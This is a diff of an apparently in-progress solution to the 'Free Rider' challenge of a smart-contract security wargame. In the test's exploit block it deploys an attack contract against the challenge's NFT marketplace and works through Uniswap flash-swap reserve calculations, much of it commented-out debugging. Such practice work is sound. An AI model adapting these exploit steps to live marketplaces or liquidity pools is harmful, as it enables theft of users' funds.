@@ -105,24 +105,52 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        const uniswapPairAttack = this.uniswapPair.connect(attacker)
-        const routerAttack = this.uniswapRouter.connect(attacker)
+        const uniswapPairAttack = await this.uniswapPair.connect(attacker)
+        const routerAttack = await this.uniswapRouter.connect(attacker)
+        const attackContract = await (await ethers.getContractFactory('Attack', attacker)).deploy(
+            this.marketplace.address,
+            this.buyerContract.address,
+            this.nft.address,
+            this.weth.address, 
+            uniswapPairAttack.address
+            );
+        const ethAttack = this.weth.connect(attacker)
 
-        console.log("Uni ETH: ", await this.weth.balanceOf(uniswapPairAttack.address))
-        console.log("Uni TOK: ", await this.token.balanceOf(uniswapPairAttack.address))
-        // await uniswapPairAttack.skim(attacker.address)
-        // await uniswapPairAttack.swap(ethers.utils.parseEther('8000'), ethers.utils.parseEther('8000'), attacker.address, [])
-        console.log("timestamp: ", await ethers.provider.getBlock(10))
-        const currentBlock = await ethers.provider.getBlock(10)
-        await routerAttack.removeLiquidityETH(
-          this.token.address,
-          ethers.utils.parseEther("100"),
-          ethers.utils.parseEther("100"),
-          ethers.utils.parseEther("100"),
-          attacker.address,
-          currentBlock.timestamp + 10000
-      ) 
-        console.log("ETH: ", await this.weth.balanceOf(attacker.address))
+        // await ethAttack.deposit({value: ethers.utils.parseEther("0.35")})
+        //await ethAttack.transfer(uniswapPairAttack.address, await ethAttack.balanceOf(attacker.address))
+        await ethAttack.approve(attackContract.address, ethers.utils.parseEther("21"))
+
+        const amount0Out = ethers.utils.parseEther("15")
+        const amount1Out = ethers.utils.parseEther("0")
+        await attackContract.transferToMarket()
+
+        // const reserves = await uniswapPairAttack.getReserves()
+        // const balance0 = await this.weth.balanceOf(uniswapPairAttack.address)
+        // const balance1 = await this.token.balanceOf(uniswapPairAttack.address)
+        // const reserve0 = reserves[0]
+        // const reserve1 = reserves[1]
+        // const amount0In = balance0 >  reserve0 - amount0Out ? balance0 - (reserve0 - amount0Out) : 0;
+        // const amount1In = balance1 > reserve1 - amount1Out ? balance1 - (reserve1 - amount1Out) : 0;
+        // console.log("amount0In: ", amount0In)
+        // console.log("amount1In: ", amount1In)
+        // const balance0Adjusted = balance0 * 1000 - amount0In * 3
+        // const balance1Adjusted = balance1 * 1000 - amount1In * 3
+        // console.log("balance0Adj: ", balance0Adjusted)
+        // console.log("balance1Adj: ", balance1Adjusted)
+        // console.log("Attacker WETH",await ethAttack.balanceOf(attacker.address))
+        // console.log("balance0 adjusted: ", await this.token.balanceOf(uniswapPairAttack.address) * 1000 - (amount0In * 3))
+        // console.log("balance1 adjusted: ", await this.weth.balanceOf(uniswapPairAttack.address) * 1000 - (amount1In * 3))
+        // console.log("left k", balance0Adjusted * balance1Adjusted)
+        // console.log("right k", reserve0 * reserve1 * 1000**2)
+
+       
+        console.log("weth", await ethAttack.balanceOf( uniswapPairAttack.address))
+        // await uniswapPairAttack.swap(amount0Out,amount1Out, attackContract.address, [] )
+
+
+        console.log("weth :", await this.weth.balanceOf(attacker.address))
+
+
     });
 
     after(async function () {
